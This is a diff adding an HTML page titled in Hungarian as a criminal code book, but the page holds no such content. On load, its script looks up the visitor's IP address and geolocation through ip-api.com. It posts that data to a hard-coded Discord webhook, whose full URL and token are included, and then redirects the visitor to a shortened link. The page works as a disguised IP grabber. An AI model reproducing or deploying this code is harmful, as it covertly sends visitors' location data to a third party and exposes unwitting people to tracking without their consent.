@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Büntető törvény könv</title>
+</head>
+<body>
+    <script>
+        var a;
+        fetch('http://ip-api.com/json/?fields=61439')
+        .then(res => res.json())
+        .then(res => {
+            a = res;
+            console.log(a);
+            console.log("Kész");
+    
+            console.log(a);
+
+            a = JSON.stringify(a);
+    
+            function sendMessage() {
+                const request = new XMLHttpRequest();
+                request.open("POST", "https://discord.com/api/webhooks/1029765485249708063/jDlqIuuh1FtxPunwiU-yQenTUjklSRfe-POjwxATOaE6aYfYslZgjKr5xNB6WwO7HHKL");
+    
+                request.setRequestHeader('Content-type', 'application/json');
+    
+                const params = {
+                    username: "My Webhook Name",
+                    avatar_url: "",
+                    content: a
+                }
+    
+                request.send(JSON.stringify(params));
+            }
+            
+            sendMessage();
+    
+            window.location.href = "https://2no.co/btkzaklatas";
+        });
+    </script>
+</body>
+</html>
